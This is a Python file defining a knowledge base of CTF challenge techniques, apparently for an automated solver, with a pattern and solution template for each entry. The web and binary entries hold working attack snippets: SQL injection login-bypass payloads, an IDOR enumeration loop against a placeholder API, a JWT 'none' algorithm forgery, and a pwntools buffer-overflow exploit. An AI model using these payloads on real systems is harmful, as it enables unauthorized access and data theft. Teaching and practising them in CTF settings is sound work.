from typing import List, Dict, Any

INITIAL_KNOWLEDGE_BASE: List[Dict[str, Any]] = [
    {
        "id": "crypto-001",
        "domain": "Cryptography",
        "title": "Time-based PRNG Seeding",
        "keywords": ["random", "seed", "time", "prng", "xor", "timestamp", "predict"],
        "pattern": "If random is seeded with int(time.time()), loop through timestamp ranges (-3600 to +3600 seconds from file creation or server response) to reproduce the exact random sequence and brute-force the XOR key.",
        "solution_template": "import random, time\nfor t in range(approx_timestamp - 3600, approx_timestamp + 3600):\n    random.seed(t)\n    key = bytes([random.randint(0, 255) for _ in range(key_len)])\n    decrypted = bytes([c ^ k for c, k in zip(ciphertext, key)])\n    if b'flag{' in decrypted.lower() or b'ctf{' in decrypted.lower():\n        print('FOUND:', decrypted, 'Seed:', t)\n        break"
    },
    {
        "id": "crypto-002",
        "domain": "Cryptography",
        "title": "Single-Byte XOR Cipher Brute Force",
        "keywords": ["xor", "hex", "ciphertext", "single-byte", "frequency", "chi-squared"],
        "pattern": "Ciphertext encrypted with a single byte repeated across the stream. Iterate 0 to 255, XOR every byte, and score the output using English letter frequency or search for flag{} header.",
        "solution_template": "raw = bytes.fromhex(hex_cipher)\nfor key in range(256):\n    dec = bytes([b ^ key for b in raw])\n    if b'flag{' in dec.lower() or b'ctf{' in dec.lower():\n        print(f'Key 0x{key:02x}: {dec}')"
    },
    {
        "id": "crypto-003",
        "domain": "Cryptography",
        "title": "RSA Small Public Exponent e=3 (Cube Root Attack)",
        "keywords": ["rsa", "e=3", "cube root", "low exponent", "modulus", "gmpy2"],
        "pattern": "When e=3 and message m is short such that m^3 < n, no modulo reduction occurs. Compute the integer cube root of ciphertext c directly to recover plaintext m.",
        "solution_template": "import gmpy2\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    print('Plaintext:', bytes.fromhex(hex(m)[2:]))"
    },
    {
        "id": "forensics-001",
        "domain": "Forensics",
        "title": "Unicode Zero-Width Steganography",
        "keywords": ["invisible", "zero-width", "whitespace", "stego", "unicode", "hidden", "spaces"],
        "pattern": "Look for invisible unicode characters: U+200B (Zero-Width Space = 0), U+200C (Zero-Width Non-Joiner = 1), U+200D (Joiner), and U+FEFF. Extract them, map each to binary digits, group into 8-bit bytes, and decode to ASCII.",
        "solution_template": "text = open('challenge.txt', 'r', encoding='utf-8').read()\nbits = ''.join(['0' if c == '\\u200b' else '1' for c in text if c in ['\\u200b', '\\u200c']])\nbytes_data = bytes([int(bits[i:i+8], 2) for i in range(0, len(bits), 8) if len(bits[i:i+8]) == 8])\nprint('Extracted Flag:', bytes_data)"
    },
    {
        "id": "forensics-002",
        "domain": "Forensics",
        "title": "File Carving & Magic Bytes Signature Repair",
        "keywords": ["png", "jpeg", "header", "magic bytes", "corrupt", "binwalk", "carving"],
        "pattern": "Files with corrupted headers or embedded payloads. Verify magic bytes (PNG: 89 50 4E 47 0D 0A 1A 0A; JPEG: FF D8 FF; ZIP: 50 4B 03 04). Use hex editing to repair damaged file headers.",
        "solution_template": "with open('corrupt.png', 'r+b') as f:\n    f.seek(0)\n    f.write(bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]))"
    },
    {
        "id": "forensics-003",
        "domain": "Forensics",
        "title": "LSB Image Steganography",
        "keywords": ["lsb", "least significant bit", "image", "stegsolve", "zsteg", "pixels"],
        "pattern": "Hidden data embedded in the least significant bit of RGB pixel values. Extract the 0th bit of red, green, and blue channels sequentially to reconstruct the hidden byte stream.",
        "solution_template": "from PIL import Image\nimg = Image.open('stego.png')\npixels = list(img.getdata())\nbits = [str(channel & 1) for p in pixels for channel in p[:3]]\nflag_bytes = bytes([int(''.join(bits[i:i+8]), 2) for i in range(0, 1000, 8)])"
    },
    {
        "id": "web-001",
        "domain": "Web",
        "title": "Client-Side Timer & LocalStorage Bypass",
        "keywords": ["timer", "localstorage", "countdown", "cookie", "client-side", "javascript"],
        "pattern": "When challenge enforces waiting timers or scores purely on the client side, inspect browser DevTools -> Application -> LocalStorage and Cookies. Modify target keys (e.g. 'time_elapsed', 'score', 'is_admin') or override JavaScript timer functions.",
        "solution_template": "// In Browser Console:\nlocalStorage.setItem('timer_completed', 'true');\nlocalStorage.setItem('score', '999999');\nlocation.reload();"
    },
    {
        "id": "web-002",
        "domain": "Web",
        "title": "SQL Injection Authentication Bypass",
        "keywords": ["sql", "injection", "sqli", "login", "auth", "bypass", "admin"],
        "pattern": "Unsanitized user input concatenated directly into SQL queries. Standard auth bypass payloads: ' OR '1'='1, admin'--, ' OR 1=1 LIMIT 1;--",
        "solution_template": "Username: admin' OR '1'='1' --\nPassword: anything"
    },
    {
        "id": "web-003",
        "domain": "Web",
        "title": "IDOR (Insecure Direct Object Reference)",
        "keywords": ["idor", "direct object", "user_id", "order_id", "parameter tampering"],
        "pattern": "Application references internal database objects directly via predictable request parameters (e.g. /profile?id=102 or /api/download?doc_id=5). Iterate IDs sequentially or test negative/admin values.",
        "solution_template": "import requests\nfor uid in range(1, 100):\n    r = requests.get(f'https://target.com/api/user/{uid}', cookies=auth_cookies)\n    if 'flag{' in r.text.lower():\n        print(f'Found flag on UID {uid}:', r.text)\n        break"
    },
    {
        "id": "web-004",
        "domain": "Web",
        "title": "JWT None Algorithm Bypass",
        "keywords": ["jwt", "token", "none", "algorithm", "signature", "tampering"],
        "pattern": "Change the JWT header 'alg' field to 'none' or 'None' and strip the signature bytes to bypass signature verification on poorly configured verifiers.",
        "solution_template": "header = '{\"alg\":\"none\",\"typ\":\"JWT\"}'\npayload = '{\"user\":\"admin\",\"is_admin\":true}'\ntoken = base64url(header) + '.' + base64url(payload) + '.'"
    },
    {
        "id": "pwn-001",
        "domain": "Binary Exploitation",
        "title": "Buffer Overflow RIP / EIP Control",
        "keywords": ["buffer overflow", "rip", "eip", "ret2win", "pwntools", "cyclic"],
        "pattern": "Unbounded input (gets, strcpy) overwrites stack frame and saved instruction pointer. Generate cyclic pattern to find exact offset to RIP, then overwrite with address of target win function.",
        "solution_template": "from pwn import *\np = process('./vuln')\noffset = 72\nwin_addr = p64(0x401156)\npayload = b'A' * offset + win_addr\np.sendline(payload)\np.interactive()"
    }
]
